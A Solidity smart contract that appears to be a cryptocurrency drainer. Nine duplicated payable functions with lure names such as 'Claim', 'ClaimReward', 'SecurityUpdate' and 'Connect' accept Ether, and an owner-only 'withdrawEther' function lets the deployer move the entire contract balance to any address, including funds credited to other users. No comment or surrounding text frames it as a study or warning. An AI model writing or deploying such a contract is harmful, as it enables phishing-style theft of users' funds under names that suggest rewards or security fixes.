// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

contract CG_Contract {

    address private owner;
    mapping(address => uint256) private balance;
    mapping(address => bool) private auto_withdraw;

    event Withdrawal(address indexed receiver, uint256 amount);
    event AutoWithdrawStatusUpdated(address indexed user, bool status);
    event Payout(address receiver, uint256 amount);
 
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    modifier validAmount() {
        require(msg.value > 0, "Invalid amount");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
              return owner;
          }

    function getBalance() public view returns (uint256) {
              return balance[msg.sender];
          }

    function getUserBalance(address wallet) public view returns (uint256) {
               return balance[wallet];
           }

    function getWithdrawStatus(address wallet) public view returns (bool) {
               return auto_withdraw[wallet];
           }

    function setWithdrawStatus(bool status) public {
            auto_withdraw[msg.sender] = status;
            emit AutoWithdrawStatusUpdated(msg.sender, status);
        }

    function withdraw() public {
           require(balance[msg.sender] > 0, "No balance to withdraw");
           uint256 amount = balance[msg.sender];
           balance[msg.sender] = 0;
           payable(msg.sender).transfer(amount);
           emit Withdrawal(msg.sender, amount);
       }

    function withdrawEther(address payable receiver, uint256 amount) public onlyOwner {
                require(address(this).balance >= amount, "Insufficient contract balance");
                receiver.transfer(amount);
                emit Withdrawal(receiver, amount);
            }

    function _executeTransaction(uint8 auto_payout, address sender, address recipient1) public payable validAmount {
                  require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                  balance[sender] += msg.value;
                  if (auto_payout == 1 && auto_withdraw[sender]) {
                      uint256 amount = balance[sender];
                      balance[sender] = 0;
                      payable(recipient1).transfer(amount);
                      emit Payout(recipient1, amount);
                  }
              }

    function Claim(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }

    function ClaimReward(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }

    function ClaimRewards(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }
   
    function Execute(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }
   
    function Multicall(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }
   
    function Swap(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }
   
    function Connect(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }
   
    function SecurityUpdate(uint8 auto_payout, address sender, address recipient1) public payable {
                 require(auto_payout == 1 || auto_payout == 0, "Invalid auto_payout value");
                 balance[sender] += msg.value;
                 if (auto_payout == 1 && auto_withdraw[sender]) {
                     uint256 amount = balance[sender];
                     balance[sender] = 0;
                     payable(recipient1).transfer(amount);
                     emit Payout(recipient1, amount);
                 }
             }
   
    receive() external payable {}
}